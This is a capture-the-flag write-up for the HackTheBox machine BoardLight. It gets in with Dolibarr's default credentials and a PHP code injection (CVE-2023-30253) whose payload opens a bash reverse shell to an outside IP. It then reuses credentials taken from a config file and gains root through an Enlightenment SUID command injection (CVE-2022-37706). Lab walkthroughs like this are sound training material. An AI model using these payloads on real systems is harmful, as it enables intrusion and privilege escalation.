# 🦋 HTB: BoardLight

**Machine Info:**
- **Platform**: [HackTheBox](https://www.hackthebox.com)  
- **IP**: `10.10.11.11`  
- **OS**: Ubuntu 20.04 LTS  
- **Difficulty**: Easy  
- **Exploits Used**:
  - Default Dolibarr credentials 🆔  
  - PHP code injection via **CVE-2023-30253** 🔓  
  - SSH login with config‐extracted creds 🔑  
  - Local root via **CVE-2022-37706** (Enlightenment WM) 👑  

---

## 🕵️ Recon

```bash
# Fast full-port scan + default scripts
nmap -p- --min-rate 10000 10.10.11.11 -oA nmap/boardlight
nmap -p 22,80 -sC -sV 10.10.11.11 -oA nmap/boardlight-tcp
```

- **SSH** (22)  
- **HTTP** (80) → Apache 2.4.41 on Ubuntu  
- Webroot hosts **Dolibarr v17.0.0** at `crm.board.htb`

```bash
# Directory / subdomain fuzzing
feroxbuster -u http://10.10.11.11 -x php
ffuf -u http://10.10.11.11 -H "Host: FUZZ.board.htb" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all
# → found crm.board.htb
```

---

## 💥 Foothold as www‑data

### 1. Login to Dolibarr CRM

- Browse to http://crm.board.htb/
- **Default creds**: `admin` / `admin`

### 2. Identify PHP injection (CVE-2023-30253)

- Create a new **Website → Page**  
- Save content containing `<?Php phpinfo(); ?>`  
- “Show dynamic content” toggle must be enabled to execute

### 3. Get reverse shell

```php
<?Php
  system('bash -i >& /dev/tcp/10.10.14.6/443 0>&1');
?>
```

- Save & preview → shell lands as `www-data` on port 443  

```bash
# Upgrade shell
script /dev/null -c bash
```

---

## 🐚 Pivot as larissa

### 1. Dolibarr config reveals DB creds

```php
# /var/www/html/crm.board.htb/htdocs/conf/conf.php
$dolibarr_main_db_user = 'dolibarrowner';
$dolibarr_main_db_pass = 'serverfun2$2023!!';
```

### 2. SSH as larissa

```bash
sshpass -p 'serverfun2$2023!!' ssh larissa@board.htb
```

- **User flag**:

```bash
cat ~/user.txt
# cbcdd575************************
```

---

## 🚀 Privilege Escalation to root

### 1. Enumerate SUID binaries

```bash
find / -perm -4000 2>/dev/null | grep enlightenment_sys
# /usr/lib/.../enlightenment_sys (setuid root)
```

### 2. Exploit CVE-2022-37706

```bash
# Prepare payload
mkdir -p /tmp/net "/tmp/;/tmp/pwn"
echo "/bin/bash" > /tmp/pwn
chmod +x /tmp/pwn

# Trigger command injection
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \
  /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u) \
  "/dev/../tmp/;/tmp/pwn" /tmp/net
```

- Spawns **root** shell:

```bash
root@boardlight:/home/larissa# cat /root/root.txt
# 5f53a104************************
```

---

## 🎉 Results

- **www‑data shell**  
- **larissa flag**: `cbcdd575************************`  
- **root flag**:    `5f53a104************************`  

---

## 🛠 Tools & References

- **SMB & SSH**: `nmap`, `sshpass`, `feroxbuster`, `ffuf`  
- **Dolibarr**: Default creds + page editor  
- **CVE-2023-30253**: PHP injection in Dolibarr → [Swascan writeup](https://swascan.com/blog-dolibarr-vulnerabilities/)  
- **CVE-2022-37706**: Enlightenment WM → [GitHub POC](https://github.com/phra/Enlightenment-CVE-2022-37706-poc)  